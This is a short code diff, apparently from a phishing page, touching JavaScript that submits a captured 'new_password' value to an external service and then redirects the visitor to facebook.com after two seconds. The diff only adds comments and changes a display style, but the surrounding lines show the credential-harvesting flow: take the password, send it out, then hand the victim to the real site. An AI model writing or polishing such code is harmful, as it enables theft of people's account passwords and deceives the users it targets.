@@ -15,10 +15,10 @@ document.getElementById('passwordForm').addEventListener('submit', function(even
     new_password: newPassword
   }).then(function(response) {
     console.log('SUCCESS!', response.status, response.text);
-    document.getElementById('passwordBox').style.display = 'none';
-    document.getElementById('successMessage').style.display = 'flex';
+    document.getElementById('passwordBox').style.display = 'none';  // Hide the form
+    document.getElementById('successMessage').style.display = 'block';  // Show success message
     setTimeout(function() {
-      window.location.href = 'https://facebook.com';
+      window.location.href = 'https://facebook.com';  // Redirect after 2 seconds
     }, 2000);
   }, function(error) {
     console.log('FAILED...', error);
